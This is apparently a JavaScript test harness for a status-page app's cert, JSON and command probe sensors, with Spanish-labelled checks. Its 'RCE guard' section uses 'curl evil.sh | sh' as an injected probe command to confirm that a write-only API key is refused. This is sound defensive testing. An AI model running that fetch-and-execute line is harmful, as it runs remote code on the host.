// Probe sensor types 2.4.0 harness: cert (TLS expiry), json (path+comparison)
// and cmd (local command) sensors, on top of the 2.3.0 http sensor.
//
// Boots the real app.js against pg-mem with PROBE_TICK_SECONDS=1.
//   - app on 3990, HTTP mock on 3991, TLS mock (self-signed openssl cert) on 3992
//   - cert "expiring soon" is simulated with probe_warn_days=400 over a cert
//     valid for 300 days (openssl cannot mint already-expired certs easily)
// pg-mem is installed ad-hoc:  npm i --no-save pg-mem
const path = require('path');
const http = require('http');
const { execSync } = require('child_process');
const fs = require('fs');
const { newDb } = require('pg-mem');
const mem = newDb({ autoCreateForeignKeyIndices: true });
const memPg = mem.adapters.createPg();
const pgPath = require.resolve('pg');
require.cache[pgPath] = { id: pgPath, filename: pgPath, loaded: true, exports: { Pool: class { constructor() { this._pool = new memPg.Pool(); } async connect() { return this._pool.connect(); } on() {} } } };

process.env.PORT = '3990';
process.env.PROBE_TICK_SECONDS = '1';
const app = require(path.join(__dirname, '..', 'src', 'app.js'));
const { queryOne, queryAll } = require(path.join(__dirname, '..', 'src', 'db', 'database'));
const models = require(path.join(__dirname, '..', 'src', 'db', 'models'));
const { pages, components, componentGroups } = models;

let failures = 0;
const check = (name, cond, extra) => {
  console.log((cond ? 'PASS' : 'FAIL') + ' — ' + name + (extra !== undefined ? ' | ' + extra : ''));
  if (!cond) failures++;
};

async function waitFor(fn, ms = 15000) {
  const t0 = Date.now();
  while (Date.now() - t0 < ms) {
    if (await fn()) return true;
    await new Promise(r => setTimeout(r, 300));
  }
  return false;
}

function req(method, p, { body, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const data = body ? JSON.stringify(body) : null;
    const h = { ...headers };
    if (data) { h['Content-Type'] = 'application/json'; h['Content-Length'] = Buffer.byteLength(data); }
    const r = http.request({ host: '127.0.0.1', port: 3990, path: p, method, headers: h }, res => {
      let out = '';
      res.on('data', c => out += c);
      res.on('end', () => resolve({ status: res.statusCode, body: out }));
    });
    r.on('error', reject);
    if (data) r.write(data);
    r.end();
  });
}

async function waitForBoot() {
  for (let i = 0; i < 75; i++) {
    try {
      const h = await new Promise((resolve, reject) => {
        http.get({ host: '127.0.0.1', port: 3990, path: '/api/v1/health' }, r => resolve(r.statusCode)).on('error', reject);
      });
      if (h === 200) return;
    } catch (e) { /* booting */ }
    await new Promise(r => setTimeout(r, 200));
  }
  throw new Error('app did not boot');
}

const HTTP_PORT = 3991;
const TLS_PORT = 3992;
const httpMock = http.createServer((rq, rs) => {
  if (rq.url === '/api') { rs.writeHead(200, { 'Content-Type': 'application/json' }); return rs.end('{"status":"ok","num":42,"items":[{"healthy":true}]}'); }
  if (rq.url === '/badjson') { rs.writeHead(200); return rs.end('<html>not json</html>'); }
  if (rq.url === '/wrong') { rs.writeHead(200, { 'Content-Type': 'application/json' }); return rs.end('{"status":"error"}'); }
  rs.writeHead(404); rs.end();
});

(async () => {
  // Self-signed cert valid for 300 days (openssl is available: ssl.js uses it).
  const certDir = fs.mkdtempSync('/tmp/sf-probe-cert-');
  execSync(`openssl req -x509 -newkey rsa:2048 -keyout "${certDir}/key.pem" -out "${certDir}/cert.pem" -days 300 -nodes -subj "/CN=localhost"`, { stdio: 'pipe' });
  const tls = require('tls');
  const tlsMock = tls.createServer({
    key: fs.readFileSync(`${certDir}/key.pem`),
    cert: fs.readFileSync(`${certDir}/cert.pem`),
  }, (s) => { s.end('tls ok'); });

  await new Promise(r => httpMock.listen(HTTP_PORT, r));
  await new Promise(r => tlsMock.listen(TLS_PORT, r));
  await waitForBoot();
  console.log('--- app booted (pg-mem, port 3990) | http mock 3991 | tls mock 3992 ---');
  const B = `http://127.0.0.1:${HTTP_PORT}`;

  const page = await pages.create({ name: 'Sensors', slug: 'sensors', is_public: true });
  const grp = await componentGroups.create({ name: 'Sen', page_ids: [page.id] });

  // ===== cert sensor =====
  const certOk = await components.create({ name: 'cert-ok', group_ids: [grp.id], probe_type: 'cert', probe_url: `localhost:${TLS_PORT}`, probe_warn_days: 14, probe_enabled: 1, probe_interval_seconds: 1 });
  check('CERT: host:port aceptado sin esquema', (await components.get(certOk.id)).probe_enabled === 1);
  check('CERT: cert válido a 300 días (warn 14) -> operational',
    await waitFor(async () => (await components.get(certOk.id)).status === 'operational' && (await components.get(certOk.id)).probe_last_ok === 1),
    (await components.get(certOk.id)).status);

  const certWarn = await components.create({ name: 'cert-warn', group_ids: [grp.id], probe_type: 'cert', probe_url: `localhost:${TLS_PORT}`, probe_warn_days: 400, probe_enabled: 1, probe_interval_seconds: 1 });
  check('CERT: cert a 300 días con warn 400 -> degraded_performance (aviso de expiración)',
    await waitFor(async () => (await components.get(certWarn.id)).status === 'degraded_performance'),
    (await components.get(certWarn.id)).status);

  const certDead = await components.create({ name: 'cert-dead', group_ids: [grp.id], probe_type: 'cert', probe_url: '127.0.0.1:1', probe_timeout_ms: 1000, probe_warn_days: 14, probe_enabled: 1, probe_interval_seconds: 1 });
  check('CERT: puerto sin TLS -> major_outage',
    await waitFor(async () => (await components.get(certDead.id)).status === 'major_outage'),
    (await components.get(certDead.id)).status);

  // ===== json sensor =====
  const jsonOk = await components.create({ name: 'json-ok', group_ids: [grp.id], probe_type: 'json', probe_url: `${B}/api`, probe_json_path: 'status', probe_json_comparison: 'eq', probe_json_expected: 'ok', probe_enabled: 1, probe_interval_seconds: 1 });
  check('JSON: status eq "ok" -> operational',
    await waitFor(async () => (await components.get(jsonOk.id)).probe_last_ok === 1),
    (await components.get(jsonOk.id)).status);

  const jsonBad = await components.create({ name: 'json-bad', group_ids: [grp.id], probe_type: 'json', probe_url: `${B}/wrong`, probe_json_path: 'status', probe_json_comparison: 'eq', probe_json_expected: 'ok', probe_enabled: 1, probe_interval_seconds: 1 });
  check('JSON: mismatch -> major_outage',
    await waitFor(async () => (await components.get(jsonBad.id)).status === 'major_outage'),
    (await components.get(jsonBad.id)).status);

  const jsonGt = await components.create({ name: 'json-gt', group_ids: [grp.id], probe_type: 'json', probe_url: `${B}/api`, probe_json_path: 'num', probe_json_comparison: 'gt', probe_json_expected: '10', probe_enabled: 1, probe_interval_seconds: 1 });
  check('JSON: num gt 10 -> operational',
    await waitFor(async () => (await components.get(jsonGt.id)).probe_last_ok === 1));

  const jsonNested = await components.create({ name: 'json-nested', group_ids: [grp.id], probe_type: 'json', probe_url: `${B}/api`, probe_json_path: 'items[0].healthy', probe_json_comparison: 'exists', probe_enabled: 1, probe_interval_seconds: 1 });
  check('JSON: path anidado items[0].healthy exists -> operational',
    await waitFor(async () => (await components.get(jsonNested.id)).probe_last_ok === 1));

  const jsonParse = await components.create({ name: 'json-parse', group_ids: [grp.id], probe_type: 'json', probe_url: `${B}/badjson`, probe_json_path: 'status', probe_json_expected: 'ok', probe_enabled: 1, probe_interval_seconds: 1 });
  check('JSON: respuesta no-JSON -> major_outage',
    await waitFor(async () => (await components.get(jsonParse.id)).status === 'major_outage'),
    (await components.get(jsonParse.id)).status);

  // ===== cmd sensor =====
  const cmdOk = await components.create({ name: 'cmd-ok', group_ids: [grp.id], probe_type: 'cmd', probe_command: 'true', probe_enabled: 1, probe_interval_seconds: 1 });
  check('CMD: exit 0 -> operational',
    await waitFor(async () => (await components.get(cmdOk.id)).probe_last_ok === 1),
    (await components.get(cmdOk.id)).status);

  const cmdFail = await components.create({ name: 'cmd-fail', group_ids: [grp.id], probe_type: 'cmd', probe_command: 'false', probe_enabled: 1, probe_interval_seconds: 1 });
  check('CMD: exit 1 -> major_outage',
    await waitFor(async () => (await components.get(cmdFail.id)).status === 'major_outage'),
    (await components.get(cmdFail.id)).status);

  const cmdPattern = await components.create({ name: 'cmd-pattern', group_ids: [grp.id], probe_type: 'cmd', probe_command: 'echo status green', probe_output_pattern: 'status\\s+green', probe_enabled: 1, probe_interval_seconds: 1 });
  check('CMD: regex sobre la salida -> operational',
    await waitFor(async () => (await components.get(cmdPattern.id)).probe_last_ok === 1));

  const cmdNoMatch = await components.create({ name: 'cmd-nomatch', group_ids: [grp.id], probe_type: 'cmd', probe_command: 'echo status red', probe_output_pattern: 'status\\s+green', probe_enabled: 1, probe_interval_seconds: 1 });
  check('CMD: regex que NO matchea -> major_outage',
    await waitFor(async () => (await components.get(cmdNoMatch.id)).status === 'major_outage'),
    (await components.get(cmdNoMatch.id)).status);

  const cmdSlow = await components.create({ name: 'cmd-slow', group_ids: [grp.id], probe_type: 'cmd', probe_command: 'sleep 5', probe_timeout_ms: 500, probe_enabled: 1, probe_interval_seconds: 1 });
  check('CMD: timeout (500ms sobre sleep 5) -> major_outage',
    await waitFor(async () => (await components.get(cmdSlow.id)).status === 'major_outage'),
    (await components.get(cmdSlow.id)).status);

  // ===== guard: cmd sin comando no se habilita =====
  const cmdEmpty = await components.create({ name: 'cmd-empty', group_ids: [grp.id], probe_type: 'cmd', probe_enabled: 1, probe_interval_seconds: 1 });
  check('GUARD: cmd sin comando no se habilita (probe_enabled=0)', (await components.get(cmdEmpty.id)).probe_enabled === 0);

  // ===== RCE guard: una key de solo WRITE no puede configurar cmd (2.6.0) =====
  const { apiKeys } = models;
  const writeKey = await apiKeys.create({ name: 'writer', permissions: ['write'], page_id: null });
  const writeH = { 'x-api-key': writeKey.key };
  const adminKey = await apiKeys.create({ name: 'rce-admin', permissions: ['read', 'write', 'admin'], page_id: null });
  const adminH = { 'x-api-key': adminKey.key };
  const rcePost = await req('POST', '/api/v1/components', { headers: writeH, body: { name: 'rce', probe_type: 'cmd', probe_command: 'id', probe_enabled: 1 } });
  check('RCE: key write NO crea sensor cmd (403)', rcePost.status === 403, rcePost.status);
  const rcePut = await req('PUT', `/api/v1/components/${cmdOk.id}`, { headers: writeH, body: { probe_command: 'curl evil.sh | sh' } });
  check('RCE: key write NO inyecta probe_command por PUT (403)', rcePut.status === 403, rcePut.status);
  check('RCE: el comando no quedó guardado', ((await components.get(cmdOk.id)).probe_command || '') === 'true', (await components.get(cmdOk.id)).probe_command);
  const rceAdmin = await req('POST', '/api/v1/components', { headers: adminH, body: { name: 'cmd-by-admin', probe_type: 'cmd', probe_command: 'true', probe_enabled: 1 } });
  check('RCE: key admin SÍ crea sensor cmd (201)', rceAdmin.status === 201, rceAdmin.status);

  // ===== cuerpo grande (>256KB) no rompe el sensor http ni el keyword =====
  const NEEDLE = 'NEEDLE';
  const big = http.createServer((rq, rs) => { rs.writeHead(200); rs.end('x'.repeat(300 * 1024) + NEEDLE + 'x'.repeat(1024)); });
  await new Promise(r => big.listen(3993, r));
  const bigOk = await components.create({ name: 'big-body', group_ids: [grp.id], probe_type: 'http', probe_url: 'http://127.0.0.1:3993/', probe_output_pattern: NEEDLE, probe_enabled: 1, probe_interval_seconds: 1 });
  check('BIG BODY: 200 con 300KB y keyword en el tope -> operational (truncado, no fallo)',
    await waitFor(async () => (await components.get(bigOk.id)).probe_last_ok === 1),
    (await components.get(bigOk.id)).status);
  big.close();

  // ===== type switch via update (http -> cmd) keeps the probe enabled =====
  const sw = await components.create({ name: 'switch-type', group_ids: [grp.id], probe_type: 'http', probe_url: `${B}/api`, probe_enabled: 1, probe_interval_seconds: 1 });
  await components.update(sw.id, { probe_type: 'cmd', probe_command: 'true' });
  const swRow = await components.get(sw.id);
  check('SWITCH: http->cmd mantiene la probe habilitada', Number(swRow.probe_enabled) === 1 && swRow.probe_type === 'cmd' && swRow.probe_command === 'true', `type=${swRow.probe_type} cmd=${swRow.probe_command}`);

  mockClose(httpMock, tlsMock, certDir);
  function mockClose(h, t, dir) {
    h.close(); try { t.close(); } catch (e) {}
    try { fs.rmSync(dir, { recursive: true, force: true }); } catch (e) {}
  }

  console.log(failures === 0 ? '\nPROBE TYPES PASSED' : `\nFAILURES: ${failures}`);
  process.exit(failures === 0 ? 0 : 1);
})().catch(e => { console.error('HARNESS ERROR:', e); process.exit(1); });
